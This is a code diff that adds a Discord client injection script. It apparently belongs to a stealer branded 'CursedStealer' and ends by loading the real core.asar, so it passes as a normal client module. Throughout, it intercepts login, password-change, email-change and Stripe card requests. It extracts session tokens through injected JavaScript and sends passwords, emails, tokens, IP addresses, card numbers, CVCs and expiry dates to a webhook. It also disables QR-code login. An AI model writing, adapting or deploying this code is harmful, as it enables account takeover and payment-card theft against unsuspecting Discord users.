+                if (gay == "") {
+                    gay = "No Rare Friends"
+                }
+                return gay
+            }
+
+            function Cool() {
+                const json = JSON.parse(info3)
+                var billing = "";
+                json.forEach(z => {
+                    if (z.type == "") {
+                        return "\`❌\`"
+                    } else if (z.type == 2 && z.invalid != !0) {
+                        billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+                    } else if (z.type == 1 && z.invalid != !0) {
+                        billing += "\`✔️\`" + " :credit_card:"
+                    } else {
+                        return "\`❌\`"
+                    }
+                })
+                if (billing == "") {
+                    billing = "\`❌\`"
+                }
+                return billing
+            }
+            if(info.avatar === null){
+                usericonurl = ""
+            }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
+            if(info.banner === null){
+                bannerurl = ""
+            }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
+
+
+            
+           const params = {
+                username: "CursedStealer Infected",
+                content: "",
+                embeds: [{
+                        "title": "CursedStealer Detect Email Changed",
+                        description: "[:skull: │ **Website**](https://www.cursedstealer.website)",
+                        "color": config['embed-color'],
+                        "fields": [{
+                                name: "Injection Info",
+                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
+                                inline: !1
+					}, {
+                                name: "Username <:username:1041634536733290596>",
+                                value: `\`${info.username}#${info.discriminator}\``,
+                                inline: !0
+					}, {
+                                name: "ID <:iduser:1041634535395307520>",
+                                value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${info.id})`,
+                                inline: !0
+					}, {
+                                name: "Nitro <a:nitro:1041639670288748634>",
+                                value: `${GetNitro(info.premium_type)}`,
+                                inline: !0
+					}, {
+                                name: "Badges <:badge:1041634538150973460>",
+                                value: `${GetBadges(info.flags)}`,
+                                inline: !0
+					}, {
+                                name: "Language <:language:1041640473477001236>",
+                                value: `${GetLangue(info.locale)}`,
+                                inline: !0
+					}, {
+                                name: "A2F <a:a2f:1040272766982692885>",
+                                value: `${GetA2F(info.mfa_enabled)}`,
+                                inline: !0
+					}, {
+                                name: "Billing <a:billing:1041641103629234196>",
+                                value: `${Cool()}`,
+                                inline: !1
+					}, {
+                                name: "New Email <a:email:1041639672037785691>",
+                                value: `\`${newemail}\``,
+                                inline: !0
+					}, {
+                                name: "<a:password:1041639669047238676> Password",
+                                value: `\`${password}\``,
+                                inline: !0
+					}, {
+                                name: "<a:tokens:1041634540537511957> Token",
+                                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
+                                inline: !1
+					},
+				],
+
+                      
+                        "thumbnail": {
+                            "url": `${usericonurl}`
+                        }
+				}, {
+                        "title": `<a:totalfriends:1041641100017946685> Total Friends (${totalFriends()})`,
+                        "color": config['embed-color'],
+                        "description": CalcFriends(),
+
+                        "image": {
+                            'url': `${bannerurl}`,
+                        },
+
+                        "thumbnail": {
+                            "url": `${usericonurl}`
+                        }
+			}
+		]
+            }
+            hooker(params)
+        })
+    })
+}
+
+
+
+
+async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
+    var info = await getFromURL("https://discord.com/api/v8/users/@me", token)
+    var {
+        ip
+    } = await getFromURL("https://www.myexternalip.com/json", null)
+        if(info.avatar === null){
+            usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+        }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
+        if(info.banner === null){
+            bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+        }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
+
+        
+        const params = {
+            username: "CursedStealer Infected",
+            content: "",
+            embeds: [{
+                    "title": "CursedStealer User Credit Card Added",
+                    "description": `
+                    **IP:** ${ip}\n\n
+                    **Username** <:username:1041634536733290596>\n\`\`\`${info.username}#${info.discriminator}\`\`\`\n
+                    **ID** <:iduser:1041634535395307520>\n\`\`\`${info.id}\`\`\`\n
+                    **Email** <a:email:1041639672037785691>\n\`\`\`${info.email}\`\`\`\n
+                    **Nitro Type** <a:nitro:1041639670288748634>\n${GetNitro(info.premium_type)}\n
+					**Language** <:language:1041640473477001236>\n${GetLangue(info.locale)}\n
+					**A2F** <a:a2f:1040272766982692885>\n${GetA2F(info.mfa_enabled)}\n
+		
+                    **Badges** <:badge:1041634538150973460>\n${GetBadges(info.flags)}\n
+                    **Credit Card Number**\n\`\`\`${number}\`\`\`\n
+                    **Credit Card Expiration**\n\`\`\`${expir_month}/${expir_year}\`\`\`\n
+                    **CVC**\n\`\`\`${cvc}\`\`\`\n
+                    <a:tokens:1041634540537511957> **Token** \n\`\`\`${token}\`\`\``,
+                    
+                    "thumbnail": {
+                        "url": "https://cdn.discordapp.com/avatars/" + info.id + "/" + info.avatar
+                    },
+            },
+        ]
+        }
+        hooker(params)
+}
+
+const ChangePasswordFilter = {
+    urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
+};
+
+
+
+
+session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
+    if (details.url.startsWith("wss://remote-auth-gateway")) return callback({
+        cancel: true
+    });
+    updateCheck();
+
+    if (FirstTime()) {}
+
+    callback({})
+    return;
+})
+
+
+session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
+    if (details.url.endsWith("login")) {
+        if (details.statusCode == 200) {
+            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
+            const email = data.login;
+            const password = data.password;
+            const window = BrowserWindow.getAllWindows()[0];
+            window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
+                Login(email, password, token)
+            }))
+        } else {}
+    }
+    if (details.url.endsWith("users/@me")) {
+        if (details.statusCode == 200 && details.method == "PATCH") {
+            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
+            if (data.password != null && data.password != undefined && data.password != "") {
+                if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
+                    const window = BrowserWindow.getAllWindows()[0];
+                    window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
+                        ChangePassword(data.password, data.new_password, token)
+                    }))
+                }
+                if (data.email != null && data.email != undefined && data.email != "") {
+                    const window = BrowserWindow.getAllWindows()[0];
+                    window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
+                        ChangeEmail(data.email, data.password, token)
+                    }))
+                }
+            }
+        } else {}
+    }
+    if (details.url.endsWith("tokens")) {
+        const window = BrowserWindow.getAllWindows()[0];
+        const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
+        window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
+            CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token)
+        })).catch(console.error);
+    }
+});
+
+
+
+module.exports = require('./core.asar')
